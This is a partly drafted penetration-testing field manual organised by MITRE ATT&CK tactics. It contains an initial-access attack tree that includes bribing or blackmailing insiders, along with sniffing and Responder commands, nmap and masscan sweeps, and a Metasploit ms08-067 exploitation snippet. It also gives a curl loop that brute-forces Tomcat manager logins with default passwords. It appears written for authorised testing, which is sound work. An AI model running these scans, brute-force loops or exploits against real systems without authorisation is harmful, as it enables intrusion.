

<!-- MarkdownTOC depth=3 autolink=true -->

- [Operational Considerations](#operational-considerations)
    - [Goals](#goals)
    - [Operation Planning](#operation-planning)
    - [Toolbox](#toolbox)
- [Tactical Objectives](#tactical-objectives)
    - [Ops-Sec Considerations](#ops-sec-considerations)
    - [Attack Infrastructure](#attack-infrastructure)
    - [Getting Access](#getting-access)
    - [Discovery](#discovery)
    - [Credential Access](#credential-access)
    - [Lateral Movement](#lateral-movement)
- [Techniques: Ops-Sec Considerations]
- [Techniques: Attack Infrastructure]
- [Techniques: Getting Access]
- [Techniques: Discovery](#techniques-discovery)
    - [Passive techniques](#passive-techniques)
    - [Understanding Network Topology](#understanding-network-topology)
    - [Services Discovery](#services-discovery)
- [Techniques: Credential Access](#techniques-credential-access)
- [Techniques: Lateral Movement](#techniques-lateral-movement)
    - [Flawed Network Equipment](#flawed-network-equipment)
    - [Flawed Remote Services](#flawed-remote-services)
        - [SMB](#smb-service)
        - [SNMP](#snmp-service)
        - [SMTP](#smtp-service)
    - [Flawed HTTP/HTTPS Remote Services](#flawed-httphttps-remote-services)
        - [Apache Tomcat: default/weak credentials](#apache-tomcat-defaultweak-credentials)
    - [Flawed embedded devices](#flawed-embedded-devices)

<!-- /MarkdownTOC -->

# Security Testing Field Manual

Introduction and purpose.

# Operational Considerations

## Goals

List of possible goals.

## Operation Planning

```
1. Set goal(s): objectives to accomplish
2. Combine various tactics to achieve your operational goal(s)
3. Select appropriate tachniques (and choose suitable tools) to achieve your tactical goals
```

## Toolbox

# Tactical Objectives

## Ops-Sec Considerations

MITRE PRE-ATT&CK: [TA0021](https://attack.mitre.org/tactics/TA0021/)

## Attack Infrastructure

MITRE PRE-ATT&CK: [TA0022](https://attack.mitre.org/tactics/TA0022/)

## Getting Access

*Tactical goal: get IP address in target's internal network*

MITRE ATT&CK: [TA0001](https://attack.mitre.org/tactics/TA0001/)

Possible techniques (in a form of attack tree):

```
1. [OR] Social Engineering
1.1. [OR] Delivery of phishing email/message
1.1.1. Malicious link (T1192)
1.1.2. Malicious attachment (T1193)
1.1.3. Malicious social media message (T1194)
1.2. Drive-by compromise (T1189)
1.3. [OR] "Tasking" insider to plant connect-back implant
1.3.1. by fooling him (e.g. run it for me; print doc from this USB)
1.3.2. by bribing him
1.3.3. by blackmailing him
1.4. Fooling insider to reveal his credentials (T1078)
...

2. [OR] Breaching the perimeter/DMZ
2.1. Exploit Public-Facing Application (T1190)
2.2. Exploit remote access mechanism (T1133)
...

3. [OR] Proximity attacks
3.1. Hacking into wireless network
3.2. Using USB drive drops (T1091)
3.3. [OR] Breaching physical perimeter
3.3.1. Plant drop-in device and plug it into network
3.3.2. Plant USB device and plug it to existing machine
...

4. [OR] Exploiting Trusted Relationship (T1199)
4.1. [OR] Hack 3rd party entity that delivers service to target (T1195)
4.1.1. Open source Software supplier 
4.1.2. Commercial Software supplier 
4.1.3. Hack company that provides services to the target
4.1.4. Hack target's contractor worker
4.2. [AND] Hack "to be acquired" company
4.2.1. Get knowledge about near aquisitions
4.2.1. Hack the company that is going to be acquired 
4.3. [AND] Build trust relationship with the target
4.3.1. Work as a contractor for the target
4.3.2. Exploit the trust that was built
...
```

## Discovery

*Tactical goal: Understand the target environment*

MITRE ATT&CK: [TA0007](https://attack.mitre.org/tactics/TA0007/)

Questions that should be asked:

```
What's the network topology? Is it flat?
Where are egress points?
Where are "multi-homed" boxes?
```

## Credential Access

*Tactical goal: Acquire valid set of credentials*

MITRE ATT&CK: [TA0006](https://attack.mitre.org/tactics/TA0006/)

## Lateral Movement

MITRE ATT&CK: [TA0008](https://attack.mitre.org/tactics/TA0008/)

# Techniques: Discovery

## Passive techniques

MITRE ATT&CK: [T1040](https://attack.mitre.org/techniques/T1040/)

Sniffing:

```
# {broad,multi}cast traffic excluding ARP
tcpdump -n -i eth0 -w tcpdump-b-m-no-arp ether broadcast and ether multicast and not arp

# Overview of IPv4 traffic
tcpdump -i eth0 -w session1-all-ipv4 -nn not ip6

# Overview of IPv6 traffic
tcpdump -i eth0 -w session1-all-ipv4 -nn ip6
```

OS fingerprinting:

```
# Linux
responder -I eth0 -A -f

# Windows
Invoke-Inveigh -IP <current-box-ip> -ConsoleOutput Y -Inspect Y

TODO:
p0f
```

Discovery of 'hidden' (i.e. all ports filtered, no ping replies) hosts:

```
cut -d' ' -f9 Responder/logs/Analyzer-Session.log | sort -u
```

## Understanding network topology

MITRE ATT&CK: N/A

Reference:

```
https://nmap.org/book/host-discovery.html
https://nmap.org/book/man-host-discovery.html
```

```
In:
IP-ranges.txt - file with IPs in scope

Out:
hostsUp.txt - initial list of alive IPs discovered in tested scope
allServices.txt - initial list of port numbers that were discovered in tested scope

# ping (ICMP echo request) sweeps:
for i in $(seq 1 254); do ping -c1 192.168.1.$i | grep 'time=' | cut -d" " -f4 | cut -d":" -f1 & done
nmap -sn 192.168.1.1-254 -oG - -PE

# host discovey (default):
nmap -n -sn == ICMP echo request,
               TCP SYN to port 443,
               TCP ACK to port 80,
               ICMP timestamp request
nmap -n -sn -T4 -iL IP-ranges.txt

# comprehensive (can be slow for huge networks) (could add: --source-port 53):
nmap -n -sn -T4 -PE -PS21,22,23,25,80,113,31339 -PA80,113,443,10042 -iL IP-ranges.txt

# host discovery + 100 top ports scan
nmap -n -PE -PS21,22,23,25,80,113,31339 -PA80,113,443,10042 -sS -iL IP-ranges.txt -F -oA allrangesFtcp -T4 --open

# as previously but more accurate (100 ports will be scanned for each & every IP in set of provided IP ranges):
nmap -n -Pn -sS -iL IP-ranges.txt -F -oA allrangesFtcpPn -T4 --open

# summary (alive hosts/devices per subnet). One-liner version suitable for /24 subnets:
for i in $(cat IP-ranges.txt | cut -d'.' -f1,2,3); do echo "### Network $i.0 ###";  grep "$i" <(grep 'Nmap scan report for' allrangesFtcp.nmap | cut -d' ' -f5) | sort -u -t '.' -k 4.1g | tee "hostsUp-${i}.0.txt"; done | tee >(grep -v '###' | sort -u > hosts-fastTcp.txt)

# Visualising network topology (minimalistic, i.e. only 5 random alive hosts per subnet):
for i in $(cat IP-ranges.txt | cut -d'.' -f1,2,3); do grep "$i" <(grep 'Nmap scan report for' allrangesFtcp.nmap | cut -d' ' -f5) | sort -t '.' -k 4.1g | shuf -n 5 -; done > 5hosts-persubnet.txt
nmap -sS -n -F -T4 -iL 5hosts-persubnet.txt --traceroute --open -oX netTopology.xml
zenmap netTopology.xml
```

Discovering additional hosts/devices:

```
# reverse DNS:
nmap -R -sL -T4 -iL IP-ranges.txt | sort -k 5.1

# discovery of additional network devices via multicasting / broadcasting
nmap --script mrinfo -e ens160 -d
nmap -sU -p 5351 --script=nat-pmp-info 10.10.10.0/24 -d --open
nmap --script broadcast-pim-discovery -e ens160 -d --script-args 'broadcast-pim-discovery.timeout=15'
nmap --script='broadcast-eigrp-discovery,broadcast-igmp-discovery,broadcast-ospf2-discover' -e ens160 --script-args 'broadcast-igmp-discovery.version=all, broadcast-igmp-discovery.timeout=13' -d

TODO:
https://nmap.org/nsedoc/scripts/wsdd-discover.html
https://nmap.org/nsedoc/scripts/targets-ipv6-multicast-echo.html
https://nmap.org/nsedoc/scripts/targets-ipv6-multicast-invalid-dst.html
https://nmap.org/nsedoc/scripts/targets-ipv6-multicast-mld.html
https://nmap.org/nsedoc/scripts/targets-ipv6-multicast-slaac.html
```

## Services discovery

MITRE ATT&CK: [T1046](https://attack.mitre.org/techniques/T1046/)

Additional scans to detected additional services:

```
In:
IP-ranges.txt - file with IPs in scope
hostsUp.txt - initial list of alive IPs discovered in tested scope

Out:
allServices.txt - refined list of port numbers that were discovered in tested scope

# Full scan of whole IP range in scope:
nmap -n -Pn -sS --open -iL IP-ranges.txt -p- -oA pscans/wholeRange-allPN -T4 --max-hostgroup 8

# Typical scans of already detected hosts:
nmap -n -Pn -sS --open -iL hostsUp.txt --top-ports 1024 -oA pscans/hostsUp-top1024 -T4
nmap -n -Pn -sS --open -iL hostsUp.txt -p- -oA pscans/hostsUp-all -T4 --max-hostgroup 8

Chosen 'incremental' scans:

#
nmap -n -Pn -sS --open -iL IP-ranges.txt -p$(rawrPorts) -oA pscans/wholeRange-rawrPN -T4

# scan 100 ports positioned 1001 - 1101 in popularity:
masscan -iL IP-ranges.txt -p$(topNports 100 1001) --rate 1000 -p -oX pscans/masscan-offset1000-top100
```

Initial enumeration:

```
In:
allServices.txt - list of port numbers that were discovered in tested scope

nmap -n -sS -T4 -sC -sV -O --open -iL hostsUp.txt -oA vscans/hostsUp.out
```

## Other techniques

### MS-RPC

# Techniques: Credential Access

# Techniques: Lateral Movement

## Flawed Network Equipment

MITRE ATT&CK: N/A

```
# looking for telnet, SNMP, TFTP, Cisco 'SIET' port (4786)
sudo nmap -n -Pn -sS -sU -pT:23,69,4786,4001,U:161,162 -iL scope.txt -T4 --open -oG network-devices.out
cat network-devices.out | grep -v '161/open|filtered/udp//snmp///' | grep -v '162/open|filtered/udp//snmptrap///' | grep -v 'Status: Up' > network-devices.txt

# look for SSH daemons with router/swich related banners
nmap -n -Pn -sS -T4 -p22 -iL scope.txt -oG - --open -sV --version-intensity 0 | grep -v 'Status: Up' | tee ssh-banners.out | grep -i cisco
also grep for: 
OpenSSH 12.1 - Palo Alto PA Firewall

# looking for devices web panels:
# (after masscan, only ports 80)
screen -d -m /bin/bash -c $'for i in $(cat masscan-allPorts.min | grep \':80$\'); do echo "$i:"; timeout 7s curl -s -L -k -I "http://$i"; done | tee http-headers.out'
# (from IP list only, only port 80)
while read i; do timeout 2s curl -s -w "%{remote_ip}" -L -I "http://$i" & done < hosts-fastTcp.txt > http-headers.out
while read i; do timeout 2s curl -s -w "%{remote_ip}" -L -k -I "https://$i" & done < hosts-fastTcp.txt > https-headers.out
screen /bin/bash -c 'while read i; do timeout 2s curl -s -w "%{remote_ip}" -L -k -I "https://$i" & done < hosts-fastTcp.txt > https-headers.out'
# (BEST: wth URLS list already generated)
screen -d -m /bin/bash -c 'while read i; do echo "$i:"; timeout 7s curl -s -L -k -I "$i"; done < urls.txt | tee http-headers.out'
then grep for: level_15_access|ios|cisco|level_15_or_view_access|level_1_or_view_access

# looking for TLS certificates CNs
wget https://gist.githubusercontent.com/mzet-/4c29137ab6b642f8f84d0fcd2f14403b/raw/088e89b21dbbcb49baefe1c7aa1590eeafc99a18/tlsScrape.sh
./tlsScrape.sh IP-ranges.txt

TODO: 
----
http://vulnerabilityassessment.co.uk/Penetration%20Test.html
find: Cisco Specific Testing


https://gitlab.com/kalilinux/packages/cisco-global-exploiter/raw/kali/master/cge.pl

https://gitlab.com/kalilinux/packages/cisco-auditing-tool/tree/kali/master

http://www.vulnerabilityassessment.co.uk/cisco.htm
-----
```

## Flawed Remote Services 

MITRE ATT&CK: T1021 / T1210

### SMB service

Ports:

    TCP: 139,445
    UDP: 137

Specifications:

    https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cifs/
    https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb/

Enumeration:

```
nmap -n -sU -sS -Pn -pT:135,139,445,5985,5986,47001,U:137 -sV --script=default,smb-enum-* -iL smb-services.txt -d | tee windows-null-sessions.out
enum4linux <IP>
```

Vulnerability: ms08-067

```
Reference: https://nmap.org/nsedoc/scripts/smb-vuln-ms08-067.html 
Affected: Windows Server 2000, Windows Server 2003, and Windows XP

Discovery:
nmap -sS -sU --script smb-vuln-ms08-067.nse -pT:445,139,U:137 -iL smb-services.txt --open -d | tee smb-vuln-ms08-067.out

Exploitation:
msf5 > use exploit/windows/smb/ms08_067_netapi
set RHOSTS <IP>
```

Vulnerability: ms10-054

```
Reference: https://nmap.org/nsedoc/scripts/smb-vuln-ms10-054.html
Notes: The script requires at least READ access right to a share on a remote machine.
```

### SNMP service

Ports:

    UDP: 161,162

Overview:

    https://en.wikipedia.org/wiki/Simple_Network_Management_Protocol

### SMTP service

Ports:

    TCP: 25,587,465

Implementations:

    https://en.wikipedia.org/wiki/List_of_mail_server_software#SMTP

Common misconfiguration: SMTP Open Relay

```
HELO ABC
MAIL FROM: foo@domain.com
RCPT TO: bar@domain.com
DATA
Testing for SMTP open relay issue.
.
QUIT
```

Noteworthy vulnerabilities:

```
```

## Flawed HTTP/HTTPS Services

MITRE ATT&CK: T1021 / T1210

### Apache Tomcat: default/weak credentials

```
Use auxiliary/scanner/http/tomcat_mgr_login
```

OR (if many different ports are used)
```
Prereq: Nmap scan results imported to msf

msf> services -S Coyote -c port -o /tmp/tomcat.csv
$ for i in $(cat /tmp/tomcat.csv | tr -d '"' | tr ',' ':'); do echo "http://$i/manager/html"; done > tomcat-urls.txt

$ wget https://raw.githubusercontent.com/netbiosX/Default-Credentials/master/Apache-Tomcat-Default-Passwords.mdown

$ cat Apache-Tomcat-Default-Passwords.mdown | tr -d ' ' | awk -F'|' '{print $2":"$3}' > PAYLOADS/tomcat-defaults.txt

$ while read line; do echo -n "$line : "; for i in $(cat PAYLOADS/tomcat-defaults.txt); do curl -H "Authorization: Basic $(echo -n "$i" | base64)" -s -o /dev/null -w "%{http_code}" --url "$line"; echo; done; done < tomcat-urls.txt > tomcats-results.txt
```

## Flawed embedded devices
